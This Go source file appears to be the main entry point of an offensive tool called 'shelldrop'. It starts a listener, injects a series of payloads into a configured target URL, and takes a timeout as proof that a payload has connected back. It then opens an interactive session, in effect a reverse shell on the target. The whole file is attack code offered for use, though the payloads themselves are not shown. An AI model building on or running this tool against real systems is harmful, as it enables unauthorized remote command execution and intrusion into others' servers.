package main

import (
	"context"
	"errors"
	"fmt"
	"os"
	"shelldrop/log"
	"shelldrop/payloads"
)

func main() {
	cfg := ParseConfig()

	ctx, cancel := context.WithCancel(context.Background())

	listener := NewListener(cfg.Listener, cancel)
	if err := listener.Start(); err != nil {
		fmt.Printf("[-] Error starting listener: %v\n", err)
		os.Exit(1)
	}
	defer listener.Close()

	injectPayloads(cfg, ctx)

	if err := listener.Interact(); err != nil {
		fmt.Printf("[-] Error during interaction: %v\n", err)
		os.Exit(1)
	}
}

func injectPayloads(cfg *Config, ctx context.Context) {
	for _, payload := range payloads.GetNames() {
		injector := NewInjector(payload).
			WithListenerConfig(cfg.Listener).
			WithUrl(cfg.Request.Url)

		if err := injector.Do(ctx); err != nil {
			if os.IsTimeout(err) || errors.Is(err, context.Canceled) {
				log.Infof("Found successful payload: %s", payload)
				return
			}

			log.Fatalf("Failed to inject payload: %v", err)
		}
	}
}
